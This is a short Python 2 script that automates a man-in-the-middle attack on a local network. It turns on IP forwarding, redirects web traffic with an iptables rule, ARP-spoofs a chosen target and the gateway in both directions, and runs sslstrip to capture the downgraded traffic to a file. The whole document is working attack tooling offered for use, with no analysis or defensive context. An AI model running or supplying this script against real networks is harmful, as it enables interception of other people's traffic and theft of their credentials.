#!/usr/bin/python

import commands
import os
import sys
sys.tracebacklimit = 0

gateway = commands.getoutput('ip route show | grep default | cut -d " " -f 3')

def parse_args():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', type=str, help="Target IP")
	parser.add_argument('-i', '--interface', type=str, help="Interface to use")
	parser.add_argument('-o', '--output_file', type=str, help="Output file")
	return parser.parse_args()

def main():
	if not os.geteuid() == 0:
    		sys.exit('Error - must be run as root!')
	args = parse_args()
	INTERFACE = args.interface
	TARGET = args.target
	OUTPUT_FILE = args.output_file
	try:
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
		print "File saved as '" + OUTPUT_FILE + "' in working directory"
		commands.getoutput('xterm -e "arpspoof -i '+INTERFACE+' -t '+gateway+' '+TARGET+'" | xterm -e "arpspoof -i '+INTERFACE+' -t '+TARGET+' '+gateway+'" | xterm -e "sslstrip -w '+OUTPUT_FILE+' -l 8080"')
	except Exception, e:
		print "Error - check parameters!"
		print "python script.py -h for help"
main()
